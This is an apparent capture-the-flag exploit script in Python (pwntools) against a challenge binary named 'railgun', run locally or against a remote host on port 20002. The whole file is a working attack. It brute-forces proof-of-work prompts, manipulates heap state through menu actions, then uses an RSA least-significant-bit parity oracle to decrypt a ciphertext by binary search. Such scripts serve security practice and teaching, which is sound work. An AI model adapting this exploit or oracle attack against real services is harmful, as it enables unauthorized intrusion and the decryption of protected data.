from pwn import *
from hashlib import *
import re
from binascii import *
from Crypto.Cipher import AES
from libnum import *
import sys

#context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
if len(sys.argv) > 1:
    try:
        p = remote(sys.argv[1], 20002,timeout=3)
    except:
        print '[*] error'
else:
    p = process("./railgun")

def pwd():
    p.recvuntil("PoW:")
    s = p.recvline()
    sha_value = re.findall("([0-9a-f]+)\+", s)[0]
    prefix = re.findall("\+([0-9a-f]+)\n",s)[0]
    prefix = unhexlify(prefix)
    for i in range(0,256):
        for j in range(0, 256):
            ss = prefix + chr(i)+chr(j)
            if sha256(ss).hexdigest() == sha_value:
                p.sendlineafter("PaD:", hexlify(chr(i)+chr(j)))

def create(desc, name):
    p.sendlineafter("description:", desc)
    p.sendlineafter("name:", name)

def menu(ix):
    p.sendlineafter("exit\n[-]", str(ix))

def get_N():
    menu(3)

def get_C():
    menu(4)

def get_C2():
    menu(8)

def mining():
    menu(2)
    p.recvuntil("mining:")
    s = p.recvline()
    sha_value = re.findall("([0-9a-f]+)\+", s)[0]
    prefix = re.findall("\+([0-9a-f]+)\n",s)[0]
    prefix = unhexlify(prefix)
    for i in range(0,256):
        for j in range(0, 256):
            ss = prefix + chr(i)+chr(j)
            if sha256(ss).hexdigest() == sha_value:
                p.sendlineafter("PaD:", hexlify(chr(i)+chr(j)))

def railgun(ix, plain):
    menu(5)
    p.sendlineafter("boss:", str(ix))
    p.sendlineafter("[-]send:", plain)
    p.sendlineafter("coins(1/0):", str(1))

def free_list_10():
    menu(6)

def edit_comment(size, content):
    menu(7)
    p.sendlineafter("lenth:", str(size))
    p.sendlineafter("comment:", content)

codebase = 0x555555554000
def debug(addr):
    gdb.attach(p, "b *{}\nc".format(hex(codebase+addr)))


aes = AES.new("\x00"*16)
def oracle(c):
    railgun(9, hex(c)[2:].strip("L"))
    p.recvuntil("pickup:")
    a = int(aes.decrypt(unhexlify(p.recvline().strip()))[0],16)
    #log.info(str(a))
    return a%2


pwd()
create("A", "A")
get_N()
p.recvuntil("pub:")
N = int(p.recvline().strip(),16)
N2 = 19318311451939227935069753392397845622915312863777495980983921173120770444531986896644461058252537187461209157406623954087000056016210374414469544543270515707594332006593122005261243446416887237578423882479754032575181471538501071946501867469172076783938774026056934945966329684167977770725077503746264183780932618040514038794656372206935204938325254362506532117784050888852623402843791427136887075895618749974551185236776590227992450139970453528297769514986342925171737332966751427718595967018781718752835482340924498491423776318796350923747051726040728721900438955113549751549691792658672302049874844965825627372157
e = 0x10001

get_C()
p.recvuntil("attack\n[+]")
C = int(p.recvline().strip(), 16)


get_C2()
p.recvuntil("check\n[+]")
C2 = int(p.recvline().strip(), 16)

for i in range(0xc9):#0xd0):
    mining()

#debug(0x27CF)
free_list_10()

#debug(0x2176)
for i in range(8):
    edit_comment(0x10, "\x00"*0xf)
#debug(0x22CC)
tmp_C = C
two_e = pow(2, e, N)
LB = 0
UB = N

while LB != UB:
    tmp_C = (two_e * tmp_C)%N
    flag = oracle(tmp_C)
    if flag==0:
        UB = (LB+UB)/2
    else:
        LB = (LB+UB)/2

#print LB
#print UB
for i in range(-1024, 1024):
    tmp = LB + i
    if pow(tmp, e, N)==C:
        print n2s(tmp)


#p.interactive()

